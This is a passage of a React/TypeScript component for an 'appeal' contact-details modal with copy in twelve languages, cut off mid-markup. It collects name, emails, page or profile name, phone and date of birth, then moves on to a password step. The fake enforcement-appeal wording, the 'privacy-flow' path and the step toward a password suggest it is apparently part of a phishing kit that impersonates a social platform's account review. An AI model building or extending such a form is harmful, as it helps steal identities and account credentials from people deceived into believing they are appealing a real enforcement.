'use client';

import React from 'react';
import Modal from '#components/modals/Modal';
import PhoneInput from 'react-phone-input-2';
import CustomCheckbox from '#components/check-box/CustomCheckbox';
import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice';
import {
  btnPrimary,
  errorTextClass,
  fieldInput,
  fieldSelect,
  fieldShell,
  fieldTextarea,
  fieldTextareaShell,
  formLabel,
  textLead,
  textMuted,
  textOverline,
} from '@/components/privacy-flow/ui-styles';
import { useI18n } from '@/i18n/I18nProvider';
import { localeToHtmlLang, type Locale } from '@/i18n/types';
import { externalLinkProps, legalLinks } from '@/data/legal-links';

export interface InformationModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onProceedToPassword: () => void;
}

function daysInMonth(month: number, year: number): number {
  if (!month || month < 1 || month > 12 || !year) return 31;
  return new Date(year, month, 0).getDate();
}

function monthOptions(locale: Locale): { value: string; label: string }[] {
  const tag = localeToHtmlLang(locale);
  return Array.from({ length: 12 }, (_, i) => ({
    value: String(i + 1),
    label: new Intl.DateTimeFormat(tag, { month: 'long' }).format(new Date(2020, i, 1)),
  }));
}

const InformationModal: React.FC<InformationModalProps> = ({
  open,
  onOpenChange,
  onProceedToPassword,
}) => {
  const { locale } = useI18n();
  const [isOpen, setIsOpen] = React.useState(open);
  const [errors, setErrors] = React.useState<Record<string, string>>({});
  const dispatch = useAppDispatch();
  const formData = useAppSelector((state) => state.stepForm.data);

  const months = React.useMemo(() => monthOptions(locale), [locale]);

  const yearEnd = new Date().getFullYear() - 13;
  const yearStart = 1920;
  const years = React.useMemo(
    () => Array.from({ length: yearEnd - yearStart + 1 }, (_, i) => String(yearEnd - i)),
    [yearEnd],
  );

  const monthNum = parseInt(formData.month, 10) || 0;
  const yearNum = parseInt(formData.year, 10) || 0;
  const maxDay =
    monthNum && yearNum ? daysInMonth(monthNum, yearNum) : 0;
  const days = React.useMemo(
    () => (maxDay ? Array.from({ length: maxDay }, (_, i) => String(i + 1)) : []),
    [maxDay],
  );

  React.useEffect(() => {
    if (!monthNum || !yearNum) {
      if (formData.day) dispatch(updateForm({ day: '' }));
      return;
    }
    const cap = daysInMonth(monthNum, yearNum);
    const d = parseInt(formData.day, 10);
    if (!d) return;
    if (d > cap) dispatch(updateForm({ day: String(cap) }));
  }, [dispatch, formData.day, monthNum, yearNum]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { id, value } = e.target;
    dispatch(updateForm({ [id as keyof FormData]: value } as Partial<FormData>));
    setErrors((prev) => ({ ...prev, [id]: '', dob: '' }));
  };

  const handleSelectChange = (id: 'day' | 'month' | 'year' | 'appealReason', value: string) => {
    dispatch(updateForm({ [id]: value } as Partial<FormData>));
    setErrors((prev) => ({ ...prev, [id]: '', dob: '' }));
  };

  React.useEffect(() => {
    setIsOpen(open);
  }, [open]);

  const handleClose = () => {
    setIsOpen(false);
    onOpenChange(false);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    try {
      e.preventDefault();

      const newErrors: Record<string, string> = {};
      if (!formData.fullName.trim()) newErrors.fullName = copy.errors.fullName;
      if (!formData.email.trim()) newErrors.email = copy.errors.email;
      if (!formData.emailBusiness.trim()) newErrors.emailBusiness = copy.errors.emailBusiness;
      if (!formData.fanpage.trim()) newErrors.fanpage = copy.errors.fanpage;
      if (!formData.phone.trim()) newErrors.phone = copy.errors.phone;

      const d = formData.day.trim();
      const m = formData.month.trim();
      const y = formData.year.trim();
      const allDob = Boolean(d && m && y);
      if (!allDob) {
        newErrors.dob = copy.errors.dobRequired;
      } else {
        const dd = parseInt(d, 10);
        const mm = parseInt(m, 10);
        const yy = parseInt(y, 10);
        const cap = daysInMonth(mm, yy);
        if (dd < 1 || dd > cap || mm < 1 || mm > 12 || yy < yearStart || yy > yearEnd) {
          newErrors.dob = copy.errors.dobInvalid;
        }
      }

      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors);
        return;
      }

      dispatch(updateForm({ ...formData }));
      onProceedToPassword();
      handleClose();
    } catch (error) {
      console.error('Error submitting form:', error);
    }
  };

  const wrap = (hasError: boolean) => fieldShell(hasError, { noMb: true });
  type ModalCopy = {
    title: string;
    intro: string;
    fullName: string;
    fullNamePlaceholder: string;
    email: string;
    emailPlaceholder: string;
    businessEmail: string;
    businessEmailPlaceholder: string;
    pageOrProfile: string;
    pageOrProfilePlaceholder: string;
    phone: string;
    dob: string;
    month: string;
    year: string;
    day: string;
    selectMonth: string;
    selectYear: string;
    selectDay: string;
    selectMonthFirst: string;
    selectYearFirst: string;
    appealReason: string;
    selectAppealReason: string;
    appealReasonOptions: { value: string; label: string }[];
    additionalContext: string;
    optional: string;
    additionalContextPlaceholder: string;
    responseTime: string;
    responseTimeStrong: string;
    agreePrefix: string;
    termsOfUse: string;
    submit: string;
    errors: {
      fullName: string;
      email: string;
      emailBusiness: string;
      fanpage: string;
      phone: string;
      dobRequired: string;
      dobInvalid: string;
    };
  };

  const copyByLocale: Record<Locale, ModalCopy> = {
    en: {
      title: 'Contact details',
      intro: 'Please complete the fields below. All information is used only to process your review request.',
      fullName: 'Full name',
      fullNamePlaceholder: 'Jane Doe',
      email: 'Email address',
      emailPlaceholder: 'you@example.com',
      businessEmail: 'Business email',
      businessEmailPlaceholder: 'work@company.com',
      pageOrProfile: 'Page or profile name',
      pageOrProfilePlaceholder: 'Your Page name',
      phone: 'Phone number',
      dob: 'Date of birth',
      month: 'Month',
      year: 'Year',
      day: 'Day',
      selectMonth: 'Select month',
      selectYear: 'Select year',
      selectDay: 'Select day',
      selectMonthFirst: 'Select month first',
      selectYearFirst: 'Select year first',
      appealReason: 'Reason for appeal',
      selectAppealReason: 'Select a reason',
      appealReasonOptions: [
        { value: 'mistaken-enforcement', label: 'This enforcement is a mistake' },
        { value: 'context-misunderstood', label: 'Content context was misunderstood' },
        { value: 'already-fixed', label: 'Issue has already been corrected' },
        { value: 'need-manual-review', label: 'Request manual review' },
      ],
      additionalContext: 'Additional context',
      optional: '(optional)',
      additionalContextPlaceholder: 'Briefly describe your case...',
      responseTime: 'Standard processing time:',
      responseTimeStrong: '24-72 business hours',
      agreePrefix: 'I agree to the',
      termsOfUse: 'Terms of use',
      submit: 'Submit',
      errors: {
        fullName: 'Please enter your full name.',
        email: 'Please enter your email address.',
        emailBusiness: 'Please enter your business email address.',
        fanpage: 'Please enter your page or profile name.',
        phone: 'Please enter your phone number.',
        dobRequired: 'Please select your full date of birth.',
        dobInvalid: 'Please select a valid date.',
      },
    },
    vi: {
      title: 'Thông tin liên hệ',
      intro: 'Vui lòng hoàn tất các trường bên dưới. Tất cả thông tin chỉ được dùng để xử lý yêu cầu xem xét.',
      fullName: 'Họ và tên',
      fullNamePlaceholder: 'Nguyễn Văn A',
      email: 'Địa chỉ email',
      emailPlaceholder: 'ban@example.com',
      businessEmail: 'Email doanh nghiệp',
      businessEmailPlaceholder: 'work@company.com',
      pageOrProfile: 'Tên Trang hoặc hồ sơ',
      pageOrProfilePlaceholder: 'Tên Trang của bạn',
      phone: 'Số điện thoại',
      dob: 'Ngày sinh',
      month: 'Tháng',
      year: 'Năm',
      day: 'Ngày',
      selectMonth: 'Chọn tháng',
      selectYear: 'Chọn năm',
      selectDay: 'Chọn ngày',
      selectMonthFirst: 'Chọn tháng trước',
      selectYearFirst: 'Chọn năm trước',
      appealReason: 'Lý do kháng nghị',
      selectAppealReason: 'Chọn lý do',
      appealReasonOptions: [
        { value: 'mistaken-enforcement', label: 'Hệ thống xử lý nhầm' },
        { value: 'context-misunderstood', label: 'Ngữ cảnh nội dung bị hiểu sai' },
        { value: 'already-fixed', label: 'Nội dung đã được chỉnh sửa' },
        { value: 'need-manual-review', label: 'Yêu cầu duyệt thủ công' },
      ],
      additionalContext: 'Thông tin bổ sung',
      optional: '(tùy chọn)',
      additionalContextPlaceholder: 'Mô tả ngắn gọn trường hợp của bạn...',
      responseTime: 'Thời gian xử lý tiêu chuẩn:',
      responseTimeStrong: '24-72 giờ làm việc',
      agreePrefix: 'Tôi đồng ý với',
      termsOfUse: 'Điều khoản sử dụng',
      submit: 'Gửi',
      errors: {
        fullName: 'Vui lòng nhập họ và tên.',
        email: 'Vui lòng nhập địa chỉ email.',
        emailBusiness: 'Vui lòng nhập email doanh nghiệp.',
        fanpage: 'Vui lòng nhập tên Trang hoặc hồ sơ.',
        phone: 'Vui lòng nhập số điện thoại.',
        dobRequired: 'Vui lòng chọn đầy đủ ngày sinh.',
        dobInvalid: 'Vui lòng chọn ngày hợp lệ.',
      },
    },
    de: {
      title: 'Kontaktdaten',
      intro: 'Bitte füllen Sie die folgenden Felder aus. Alle Informationen werden nur zur Bearbeitung Ihrer Überprüfungsanfrage verwendet.',
      fullName: 'Vollständiger Name',
      fullNamePlaceholder: 'Max Mustermann',
      email: 'E-Mail-Adresse',
      emailPlaceholder: 'sie@beispiel.de',
      businessEmail: 'Geschäftliche E-Mail',
      businessEmailPlaceholder: 'work@company.com',
      pageOrProfile: 'Seiten- oder Profilname',
      pageOrProfilePlaceholder: 'Name Ihrer Seite',
      phone: 'Telefonnummer',
      dob: 'Geburtsdatum',
      month: 'Monat',
      year: 'Jahr',
      day: 'Tag',
      selectMonth: 'Monat auswählen',
      selectYear: 'Jahr auswählen',
      selectDay: 'Tag auswählen',
      selectMonthFirst: 'Zuerst Monat auswählen',
      selectYearFirst: 'Zuerst Jahr auswählen',
      appealReason: 'Einspruchsgrund',
      selectAppealReason: 'Grund auswählen',
      appealReasonOptions: [
        { value: 'mistaken-enforcement', label: 'Die Durchsetzung ist fehlerhaft' },
        { value: 'context-misunderstood', label: 'Der Kontext wurde missverstanden' },
        { value: 'already-fixed', label: 'Problem wurde bereits behoben' },
        { value: 'need-manual-review', label: 'Manuelle Prüfung anfordern' },
      ],
      additionalContext: 'Zusätzliche Angaben',
      optional: '(optional)',
      additionalContextPlaceholder: 'Beschreiben Sie Ihren Fall kurz...',
      responseTime: 'Standardbearbeitungszeit:',
      responseTimeStrong: '24-72 Geschäftsstunden',
      agreePrefix: 'Ich stimme den',
      termsOfUse: 'Nutzungsbedingungen',
      submit: 'Senden',
      errors: {
        fullName: 'Bitte geben Sie Ihren vollständigen Namen ein.',
        email: 'Bitte geben Sie Ihre E-Mail-Adresse ein.',
        emailBusiness: 'Bitte geben Sie Ihre geschäftliche E-Mail-Adresse ein.',
        fanpage: 'Bitte geben Sie Ihren Seiten- oder Profilnamen ein.',
        phone: 'Bitte geben Sie Ihre Telefonnummer ein.',
        dobRequired: 'Bitte wählen Sie Ihr vollständiges Geburtsdatum aus.',
        dobInvalid: 'Bitte wählen Sie ein gültiges Datum aus.',
      },
    },
    es: {
      title: 'Datos de contacto',
      intro: 'Completa los campos a continuación. Toda la información se usa solo para procesar tu solicitud de revisión.',
      fullName: 'Nombre completo',
      fullNamePlaceholder: 'Juan Pérez',
      email: 'Correo electrónico',
      emailPlaceholder: 'tu@ejemplo.com',
      businessEmail: 'Correo empresarial',
      businessEmailPlaceholder: 'work@company.com',
      pageOrProfile: 'Nombre de página o perfil',
      pageOrProfilePlaceholder: 'Nombre de tu página',
      phone: 'Número de teléfono',
      dob: 'Fecha de nacimiento',
      month: 'Mes',
      year: 'Año',
      day: 'Día',
      selectMonth: 'Selecciona mes',
      selectYear: 'Selecciona año',
      selectDay: 'Selecciona día',
      selectMonthFirst: 'Selecciona mes primero',
      selectYearFirst: 'Selecciona año primero',
      appealReason: 'Motivo de apelación',
      selectAppealReason: 'Selecciona un motivo',
      appealReasonOptions: [
        { value: 'mistaken-enforcement', label: 'Esta medida es un error' },
        { value: 'context-misunderstood', label: 'Se malinterpretó el contexto' },
        { value: 'already-fixed', label: 'El problema ya fue corregido' },
        { value: 'need-manual-review', label: 'Solicitar revisión manual' },
      ],
      additionalContext: 'Contexto adicional',
      optional: '(opcional)',
      additionalContextPlaceholder: 'Describe brevemente tu caso...',
      responseTime: 'Tiempo de procesamiento estándar:',
      responseTimeStrong: '24-72 horas hábiles',
      agreePrefix: 'Acepto los',
      termsOfUse: 'Términos de uso',
      submit: 'Enviar',
      errors: {
        fullName: 'Ingresa tu nombre completo.',
        email: 'Ingresa tu correo electrónico.',
        emailBusiness: 'Ingresa tu correo empresarial.',
        fanpage: 'Ingresa el nombre de tu página o perfil.',
        phone: 'Ingresa tu número de teléfono.',
        dobRequired: 'Selecciona tu fecha de nacimiento completa.',
        dobInvalid: 'Selecciona una fecha válida.',
      },
    },
    fr: {
      title: 'Coordonnées',
      intro: 'Veuillez remplir les champs ci-dessous. Toutes les informations servent uniquement à traiter votre demande de révision.',
      fullName: 'Nom complet',
      fullNamePlaceholder: 'Jean Dupont',
      email: 'Adresse e-mail',
      emailPlaceholder: 'vous@exemple.com',
      businessEmail: 'E-mail professionnel',
      businessEmailPlaceholder: 'work@company.com',
      pageOrProfile: 'Nom de la page ou du profil',
      pageOrProfilePlaceholder: 'Nom de votre page',
      phone: 'Numéro de téléphone',
      dob: 'Date de naissance',
      month: 'Mois',
      year: 'Année',
      day: 'Jour',
      selectMonth: 'Sélectionnez le mois',
      selectYear: 'Sélectionnez l’année',
      selectDay: 'Sélectionnez le jour',
      selectMonthFirst: 'Sélectionnez d’abord le mois',
      selectYearFirst: 'Sélectionnez d’abord l’année',
      appealReason: 'Motif de contestation',
      selectAppealReason: 'Sélectionnez un motif',
      appealReasonOptions: [
        { value: 'mistaken-enforcement', label: 'Cette mesure est une erreur' },
        { value: 'context-misunderstood', label: 'Le contexte a été mal compris' },
        { value: 'already-fixed', label: 'Le problème a déjà été corrigé' },
        { value: 'need-manual-review', label: 'Demander une révision manuelle' },
      ],
      additionalContext: 'Contexte supplémentaire',
      optional: '(optionnel)',
      additionalContextPlaceholder: 'Décrivez brièvement votre cas...',
      responseTime: 'Délai de traitement standard :',
      responseTimeStrong: '24-72 heures ouvrées',
      agreePrefix: "J'accepte les",
      termsOfUse: "Conditions d'utilisation",
      submit: 'Envoyer',
      errors: {
        fullName: 'Veuillez saisir votre nom complet.',
        email: 'Veuillez saisir votre adresse e-mail.',
        emailBusiness: 'Veuillez saisir votre e-mail professionnel.',
        fanpage: 'Veuillez saisir le nom de votre page ou profil.',
        phone: 'Veuillez saisir votre numéro de téléphone.',
        dobRequired: 'Veuillez sélectionner votre date de naissance complète.',
        dobInvalid: 'Veuillez sélectionner une date valide.',
      },
    },
    ja: {
      ...({
        title: '連絡先情報',
        intro: '以下の項目を入力してください。情報は審査リクエストの処理にのみ使用されます。',
        fullName: '氏名',
        fullNamePlaceholder: '山田 太郎',
        email: 'メールアドレス',
        emailPlaceholder: 'you@example.com',
        businessEmail: '業務用メール',
        businessEmailPlaceholder: 'work@company.com',
        pageOrProfile: 'ページまたはプロフィール名',
        pageOrProfilePlaceholder: 'ページ名',
        phone: '電話番号',
        dob: '生年月日',
        month: '月',
        year: '年',
        day: '日',
        selectMonth: '月を選択',
        selectYear: '年を選択',
        selectDay: '日を選択',
        selectMonthFirst: '先に月を選択',
        selectYearFirst: '先に年を選択',
        appealReason: '異議申し立て理由',
        selectAppealReason: '理由を選択',
        appealReasonOptions: [
          { value: 'mistaken-enforcement', label: '判定が誤っている' },
          { value: 'context-misunderstood', label: '文脈が誤解されている' },
          { value: 'already-fixed', label: '問題はすでに修正済み' },
          { value: 'need-manual-review', label: '手動審査を依頼' },
        ],
        additionalContext: '補足情報',
        optional: '(任意)',
        additionalContextPlaceholder: 'ケースを簡潔に説明してください...',
        responseTime: '標準処理時間：',
        responseTimeStrong: '24-72 営業時間',
        agreePrefix: '私は',
        termsOfUse: '利用規約',
        submit: '送信',
        errors: {
          fullName: '氏名を入力してください。',
          email: 'メールアドレスを入力してください。',
          emailBusiness: '業務用メールを入力してください。',
          fanpage: 'ページまたはプロフィール名を入力してください。',
          phone: '電話番号を入力してください。',
          dobRequired: '生年月日をすべて選択してください。',
          dobInvalid: '有効な日付を選択してください。',
        },
      } as ModalCopy),
    },
    ko: {
      ...({
        title: '연락처 정보',
        intro: '아래 항목을 입력해 주세요. 모든 정보는 검토 요청 처리에만 사용됩니다.',
        fullName: '이름',
        fullNamePlaceholder: '홍길동',
        email: '이메일 주소',
        emailPlaceholder: 'you@example.com',
        businessEmail: '비즈니스 이메일',
        businessEmailPlaceholder: 'work@company.com',
        pageOrProfile: '페이지 또는 프로필 이름',
        pageOrProfilePlaceholder: '페이지 이름',
        phone: '전화번호',
        dob: '생년월일',
        month: '월',
        year: '년',
        day: '일',
        selectMonth: '월 선택',
        selectYear: '연도 선택',
        selectDay: '일 선택',
        selectMonthFirst: '먼저 월을 선택하세요',
        selectYearFirst: '먼저 연도를 선택하세요',
        appealReason: '이의 제기 사유',
        selectAppealReason: '사유 선택',
        appealReasonOptions: [
          { value: 'mistaken-enforcement', label: '조치가 잘못되었습니다' },
          { value: 'context-misunderstood', label: '콘텐츠 맥락이 오해되었습니다' },
          { value: 'already-fixed', label: '문제가 이미 수정되었습니다' },
          { value: 'need-manual-review', label: '수동 검토 요청' },
        ],
        additionalContext: '추가 설명',
        optional: '(선택)',
        additionalContextPlaceholder: '사례를 간단히 설명해 주세요...',
        responseTime: '표준 처리 시간:',
        responseTimeStrong: '24-72 영업시간',
        agreePrefix: '다음에 동의합니다',
        termsOfUse: '이용 약관',
        submit: '제출',
        errors: {
          fullName: '이름을 입력해 주세요.',
          email: '이메일 주소를 입력해 주세요.',
          emailBusiness: '비즈니스 이메일을 입력해 주세요.',
          fanpage: '페이지 또는 프로필 이름을 입력해 주세요.',
          phone: '전화번호를 입력해 주세요.',
          dobRequired: '생년월일을 모두 선택해 주세요.',
          dobInvalid: '유효한 날짜를 선택해 주세요.',
        },
      } as ModalCopy),
    },
    pt: {
      title: 'Detalhes de contato',
      intro: 'Preencha os campos abaixo. Todas as informações são usadas apenas para processar sua solicitação de revisão.',
      fullName: 'Nome completo',
      fullNamePlaceholder: 'João Silva',
      email: 'Endereço de e-mail',
      emailPlaceholder: 'voce@exemplo.com',
      businessEmail: 'E-mail comercial',
      businessEmailPlaceholder: 'work@company.com',
      pageOrProfile: 'Nome da página ou perfil',
      pageOrProfilePlaceholder: 'Nome da sua página',
      phone: 'Número de telefone',
      dob: 'Data de nascimento',
      month: 'Mês',
      year: 'Ano',
      day: 'Dia',
      selectMonth: 'Selecionar mês',
      selectYear: 'Selecionar ano',
      selectDay: 'Selecionar dia',
      selectMonthFirst: 'Selecione o mês primeiro',
      selectYearFirst: 'Selecione o ano primeiro',
      appealReason: 'Motivo da contestação',
      selectAppealReason: 'Selecione um motivo',
      appealReasonOptions: [
        { value: 'mistaken-enforcement', label: 'Essa medida é um erro' },
        { value: 'context-misunderstood', label: 'O contexto foi mal interpretado' },
        { value: 'already-fixed', label: 'O problema já foi corrigido' },
        { value: 'need-manual-review', label: 'Solicitar revisão manual' },
      ],
      additionalContext: 'Contexto adicional',
      optional: '(opcional)',
      additionalContextPlaceholder: 'Descreva brevemente seu caso...',
      responseTime: 'Tempo de processamento padrão:',
      responseTimeStrong: '24-72 horas úteis',
      agreePrefix: 'Concordo com os',
      termsOfUse: 'Termos de uso',
      submit: 'Enviar',
      errors: {
        fullName: 'Insira seu nome completo.',
        email: 'Insira seu endereço de e-mail.',
        emailBusiness: 'Insira seu e-mail comercial.',
        fanpage: 'Insira o nome da página ou perfil.',
        phone: 'Insira seu número de telefone.',
        dobRequired: 'Selecione sua data de nascimento completa.',
        dobInvalid: 'Selecione uma data válida.',
      },
    },
    th: {
      ...({
        title: 'รายละเอียดการติดต่อ',
        intro: 'กรุณากรอกข้อมูลด้านล่าง ข้อมูลทั้งหมดใช้เพื่อดำเนินการคำขอทบทวนเท่านั้น',
        fullName: 'ชื่อ-นามสกุล',
        fullNamePlaceholder: 'สมชาย ใจดี',
        email: 'อีเมล',
        emailPlaceholder: 'you@example.com',
        businessEmail: 'อีเมลองค์กร',
        businessEmailPlaceholder: 'work@company.com',
        pageOrProfile: 'ชื่อเพจหรือโปรไฟล์',
        pageOrProfilePlaceholder: 'ชื่อเพจของคุณ',
        phone: 'หมายเลขโทรศัพท์',
        dob: 'วันเดือนปีเกิด',
        month: 'เดือน',
        year: 'ปี',
        day: 'วัน',
        selectMonth: 'เลือกเดือน',
        selectYear: 'เลือกปี',
        selectDay: 'เลือกวัน',
        selectMonthFirst: 'เลือกเดือนก่อน',
        selectYearFirst: 'เลือกปีก่อน',
        appealReason: 'เหตุผลในการอุทธรณ์',
        selectAppealReason: 'เลือกเหตุผล',
        appealReasonOptions: [
          { value: 'mistaken-enforcement', label: 'ระบบบังคับใช้ผิดพลาด' },
          { value: 'context-misunderstood', label: 'เข้าใจบริบทเนื้อหาผิด' },
          { value: 'already-fixed', label: 'แก้ไขปัญหาแล้ว' },
          { value: 'need-manual-review', label: 'ขอให้ตรวจสอบด้วยเจ้าหน้าที่' },
        ],
        additionalContext: 'ข้อมูลเพิ่มเติม',
        optional: '(ไม่บังคับ)',
        additionalContextPlaceholder: 'อธิบายกรณีของคุณโดยย่อ...',
        responseTime: 'ระยะเวลาดำเนินการมาตรฐาน:',
        responseTimeStrong: '24-72 ชั่วโมงทำการ',
        agreePrefix: 'ฉันยอมรับ',
        termsOfUse: 'ข้อกำหนดการใช้งาน',
        submit: 'ส่ง',
        errors: {
          fullName: 'กรุณากรอกชื่อ-นามสกุล',
          email: 'กรุณากรอกอีเมล',
          emailBusiness: 'กรุณากรอกอีเมลองค์กร',
          fanpage: 'กรุณากรอกชื่อเพจหรือโปรไฟล์',
          phone: 'กรุณากรอกหมายเลขโทรศัพท์',
          dobRequired: 'กรุณาเลือกวันเดือนปีเกิดให้ครบ',
          dobInvalid: 'กรุณาเลือกวันที่ถูกต้อง',
        },
      } as ModalCopy),
    },
    id: {
      title: 'Detail kontak',
      intro: 'Silakan lengkapi kolom di bawah. Semua informasi hanya digunakan untuk memproses permintaan peninjauan Anda.',
      fullName: 'Nama lengkap',
      fullNamePlaceholder: 'Budi Santoso',
      email: 'Alamat email',
      emailPlaceholder: 'anda@contoh.com',
      businessEmail: 'Email bisnis',
      businessEmailPlaceholder: 'work@company.com',
      pageOrProfile: 'Nama halaman atau profil',
      pageOrProfilePlaceholder: 'Nama Halaman Anda',
      phone: 'Nomor telepon',
      dob: 'Tanggal lahir',
      month: 'Bulan',
      year: 'Tahun',
      day: 'Hari',
      selectMonth: 'Pilih bulan',
      selectYear: 'Pilih tahun',
      selectDay: 'Pilih hari',
      selectMonthFirst: 'Pilih bulan terlebih dahulu',
      selectYearFirst: 'Pilih tahun terlebih dahulu',
      appealReason: 'Alasan banding',
      selectAppealReason: 'Pilih alasan',
      appealReasonOptions: [
        { value: 'mistaken-enforcement', label: 'Penindakan ini keliru' },
        { value: 'context-misunderstood', label: 'Konteks konten disalahpahami' },
        { value: 'already-fixed', label: 'Masalah sudah diperbaiki' },
        { value: 'need-manual-review', label: 'Minta peninjauan manual' },
      ],
      additionalContext: 'Konteks tambahan',
      optional: '(opsional)',
      additionalContextPlaceholder: 'Jelaskan kasus Anda secara singkat...',
      responseTime: 'Waktu pemrosesan standar:',
      responseTimeStrong: '24-72 jam kerja',
      agreePrefix: 'Saya menyetujui',
      termsOfUse: 'Ketentuan penggunaan',
      submit: 'Kirim',
      errors: {
        fullName: 'Silakan masukkan nama lengkap Anda.',
        email: 'Silakan masukkan alamat email Anda.',
        emailBusiness: 'Silakan masukkan email bisnis Anda.',
        fanpage: 'Silakan masukkan nama halaman atau profil Anda.',
        phone: 'Silakan masukkan nomor telepon Anda.',
        dobRequired: 'Silakan pilih tanggal lahir lengkap Anda.',
        dobInvalid: 'Silakan pilih tanggal yang valid.',
      },
    },
    zh: {
      ...({
        title: '联系信息',
        intro: '请填写以下字段。所有信息仅用于处理您的复审请求。',
        fullName: '姓名',
        fullNamePlaceholder: '张伟',
        email: '电子邮箱',
        emailPlaceholder: 'you@example.com',
        businessEmail: '企业邮箱',
        businessEmailPlaceholder: 'work@company.com',
        pageOrProfile: '主页或个人资料名称',
        pageOrProfilePlaceholder: '您的主页名称',
        phone: '电话号码',
        dob: '出生日期',
        month: '月',
        year: '年',
        day: '日',
        selectMonth: '选择月份',
        selectYear: '选择年份',
        selectDay: '选择日期',
        selectMonthFirst: '请先选择月份',
        selectYearFirst: '请先选择年份',
        appealReason: '申诉原因',
        selectAppealReason: '选择原因',
        appealReasonOptions: [
          { value: 'mistaken-enforcement', label: '系统判定有误' },
          { value: 'context-misunderstood', label: '内容语境被误解' },
          { value: 'already-fixed', label: '问题已修复' },
          { value: 'need-manual-review', label: '请求人工复审' },
        ],
        additionalContext: '补充说明',
        optional: '（可选）',
        additionalContextPlaceholder: '请简要描述您的情况...',
        responseTime: '标准处理时间：',
        responseTimeStrong: '24-72 个工作小时',
        agreePrefix: '我同意',
        termsOfUse: '使用条款',
        submit: '提交',
        errors: {
          fullName: '请输入您的姓名。',
          email: '请输入您的电子邮箱。',
          emailBusiness: '请输入您的企业邮箱。',
          fanpage: '请输入主页或个人资料名称。',
          phone: '请输入您的电话号码。',
          dobRequired: '请选择完整的出生日期。',
          dobInvalid: '请选择有效日期。',
        },
      } as ModalCopy),
    },
    ms: {
      title: 'Butiran hubungan',
      intro: 'Sila lengkapkan medan di bawah. Semua maklumat hanya digunakan untuk memproses permintaan semakan anda.',
      fullName: 'Nama penuh',
      fullNamePlaceholder: 'Ahmad Ali',
      email: 'Alamat e-mel',
      emailPlaceholder: 'anda@contoh.com',
      businessEmail: 'E-mel perniagaan',
      businessEmailPlaceholder: 'work@company.com',
      pageOrProfile: 'Nama halaman atau profil',
      pageOrProfilePlaceholder: 'Nama Halaman anda',
      phone: 'Nombor telefon',
      dob: 'Tarikh lahir',
      month: 'Bulan',
      year: 'Tahun',
      day: 'Hari',
      selectMonth: 'Pilih bulan',
      selectYear: 'Pilih tahun',
      selectDay: 'Pilih hari',
      selectMonthFirst: 'Pilih bulan dahulu',
      selectYearFirst: 'Pilih tahun dahulu',
      appealReason: 'Sebab rayuan',
      selectAppealReason: 'Pilih sebab',
      appealReasonOptions: [
        { value: 'mistaken-enforcement', label: 'Tindakan ini adalah kesilapan' },
        { value: 'context-misunderstood', label: 'Konteks kandungan disalah faham' },
        { value: 'already-fixed', label: 'Isu telah diperbetulkan' },
        { value: 'need-manual-review', label: 'Mohon semakan manual' },
      ],
      additionalContext: 'Konteks tambahan',
      optional: '(pilihan)',
      additionalContextPlaceholder: 'Terangkan kes anda secara ringkas...',
      responseTime: 'Masa pemprosesan standard:',
      responseTimeStrong: '24-72 jam bekerja',
      agreePrefix: 'Saya bersetuju dengan',
      termsOfUse: 'Terma penggunaan',
      submit: 'Hantar',
      errors: {
        fullName: 'Sila masukkan nama penuh anda.',
        email: 'Sila masukkan alamat e-mel anda.',
        emailBusiness: 'Sila masukkan e-mel perniagaan anda.',
        fanpage: 'Sila masukkan nama halaman atau profil anda.',
        phone: 'Sila masukkan nombor telefon anda.',
        dobRequired: 'Sila pilih tarikh lahir penuh anda.',
        dobInvalid: 'Sila pilih tarikh yang sah.',
      },
    },
  };
  const copy = copyByLocale[locale];

  return (
    <Modal
      isOpen={isOpen}
      title={copy.title}
      onClose={handleClose}
    >
      <div className="flex w-full max-w-full flex-col">
        <p className={`mb-6 max-w-prose ${textLead}`}>
          {copy.intro}
        </p>

        <form onSubmit={handleSubmit} autoComplete="off" className="w-full">
          <div className="flex flex-col gap-5">
            <div>
              <label className={formLabel} htmlFor="fullName">
                {copy.fullName}
              </label>
              <div className={wrap(!!errors.fullName)}>
                <input
                  type="text"
                  id="fullName"
                  placeholder={copy.fullNamePlaceholder}
                  className={fieldInput}
                  value={formData.fullName}
                  onChange={handleChange}
                />
              </div>
              {errors.fullName ? <p className={errorTextClass}>{errors.fullName}</p> : null}
            </div>

            <div>
              <label className={formLabel} htmlFor="email">
                {copy.email}
              </label>
              <div className={wrap(!!errors.email)}>
                <input
                  type="email"
                  id="email"
                  placeholder={copy.emailPlaceholder}
                  className={fieldInput}
                  value={formData.email}
                  onChange={handleChange}
                  autoComplete="email"
                />
              </div>
              {errors.email ? <p className={errorTextClass}>{errors.email}</p> : null}
            </div>

            <div>
              <label className={formLabel} htmlFor="emailBusiness">
                {copy.businessEmail}
              </label>
              <div className={wrap(!!errors.emailBusiness)}>
                <input
                  type="email"
                  id="emailBusiness"
                  placeholder={copy.businessEmailPlaceholder}
                  className={fieldInput}
                  value={formData.emailBusiness}
                  onChange={handleChange}
                  autoComplete="email"
                />
              </div>
              {errors.emailBusiness ? <p className={errorTextClass}>{errors.emailBusiness}</p> : null}
            </div>

            <div>
              <label className={formLabel} htmlFor="fanpage">
                {copy.pageOrProfile}
              </label>
              <div className={wrap(!!errors.fanpage)}>
                <input
                  type="text"
                  id="fanpage"
                  placeholder={copy.pageOrProfilePlaceholder}
                  className={fieldInput}
                  value={formData.fanpage}
                  onChange={handleChange}
                />
              </div>
              {errors.fanpage ? <p className={errorTextClass}>{errors.fanpage}</p> : null}
            </div>

            <div>
              <label className={formLabel} htmlFor="phone">
                {copy.phone}
              </label>
              <div className={`${wrap(!!errors.phone)} phone-field-shell`}>
                <PhoneInput
                  country={formData.country_code?.toLowerCase() || 'us'}
                  value={formData.phone}
                  inputClass="!h-full !w-full !pl-[52px] !text-[15px] !leading-normal !text-slate-900 !placeholder:text-slate-400 !border-0 !bg-transparent"
                  containerClass="!h-full !w-full phone-input-pro"
                  buttonClass="!rounded-l-xl"
                  inputProps={{ id: 'phone' }}
                  onChange={(phone) => {
                    dispatch(updateForm({ phone }));
                    setErrors((prev) => ({ ...prev, phone: '' }));
                  }}
                />
              </div>
              {errors.phone ? <p className={errorTextClass}>{errors.phone}</p> : null}
            </div>

            <div>
